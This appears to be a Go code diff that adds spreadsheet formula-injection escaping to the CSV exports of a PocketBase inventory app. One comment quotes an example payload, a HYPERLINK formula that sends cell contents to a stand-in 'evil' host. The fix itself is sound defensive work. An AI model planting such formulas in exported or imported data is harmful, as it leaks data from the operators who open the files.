@@ -12,11 +12,47 @@ import (
 	"encoding/csv"
 	"fmt"
 	"io"
+	"strconv"
 	"time"
 
 	"github.com/pocketbase/dbx"
 	"github.com/pocketbase/pocketbase/core"
 )
+
+// csvSafe neutralizes CSV / spreadsheet formula injection. Excel, Google
+// Sheets, and LibreOffice treat a cell whose first character is = + - @ (or a
+// leading tab / CR that some parsers strip to reveal the next char) as a
+// formula. Catalog text (item/user names, notes, categories, reasons) round-
+// trips from the *untrusted* CSV importer into these admin-facing exports — in
+// managed mode it's even pushed fleet-wide — so a crafted value like
+// `=HYPERLINK("http://evil/?"&A1,"x")` would execute when an operator opens
+// the file. Prefixing with a single quote forces the cell to plain text.
+//
+// A leading '-' is exempted when the whole value is a number so negative
+// quantities/deltas aren't mangled — those columns aren't an injection vector.
+func csvSafe(s string) string {
+	if s == "" {
+		return s
+	}
+	switch s[0] {
+	case '=', '+', '@', '\t', '\r':
+		return "'" + s
+	case '-':
+		if _, err := strconv.ParseFloat(s, 64); err != nil {
+			return "'" + s
+		}
+	}
+	return s
+}
+
+// writeRow sanitizes every field with csvSafe, then writes the row. Used for
+// data rows; constant header rows go through cw.Write directly.
+func writeRow(cw *csv.Writer, fields []string) error {
+	for i, f := range fields {
+		fields[i] = csvSafe(f)
+	}
+	return cw.Write(fields)
+}
 
 // TransactionsOptions narrows the transactions export. Zero values mean
 // "no filter on that bound." From/To filter on `completed_at` (inclusive).
@@ -54,7 +90,7 @@ func WriteItemsCSV(app core.App, w io.Writer) error {
 		if it.GetBool("active") {
 			active = "true"
 		}
-		if err := cw.Write([]string{
+		if err := writeRow(cw, []string{
 			it.GetString("code"),
 			it.GetString("name"),
 			it.GetString("type"),
@@ -137,7 +173,7 @@ func WriteTransactionsCSV(app core.App, w io.Writer, opts TransactionsOptions) e
 		if opts.IncludeSourceKiosk {
 			row = append(row, t.GetString("source_kiosk_code"))
 		}
-		if err := cw.Write(row); err != nil {
+		if err := writeRow(cw, row); err != nil {
 			return err
 		}
 	}
